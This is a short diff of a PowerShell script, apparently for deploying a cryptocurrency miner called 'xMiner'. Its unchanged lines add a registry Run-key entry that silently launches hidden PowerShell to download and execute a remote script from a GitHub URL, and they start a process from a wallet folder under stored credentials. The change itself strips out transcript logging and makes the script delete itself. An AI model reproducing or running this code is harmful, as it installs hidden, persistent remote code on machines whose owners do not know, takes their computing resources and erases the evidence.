@@ -1,4 +1,3 @@
-Start-Transcript -Path "C:\transcript-xminer.txt" -NoClobber;
 cmd.exe /c "reg.exe add ""HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run"" /v ""xMiner"" /t REG_SZ /d ""C:\WINDOWS\system32\WindowsPowerShell\v1.0\powershell.exe -w hidden IEX ((new-object net.webclient).downloadstring('https://raw.githubusercontent.com/tmmdemo/automate/master/xminer.ps1'))"" /f"
 
 Start-Sleep -s 2
@@ -46,6 +45,6 @@ $securePassword = ConvertTo-SecureString $password -AsPlainText -Force
 $credential = New-Object System.Management.Automation.PSCredential $username, $securePassword
 Start-Process -FilePath $DEST -WorkingDirectory "c:\wallet" -Credential ($credential)
 #& $DEST
-Stop-Transcript;
+Remove-Item -Path C:\xminer.ps1 -Force
 
 
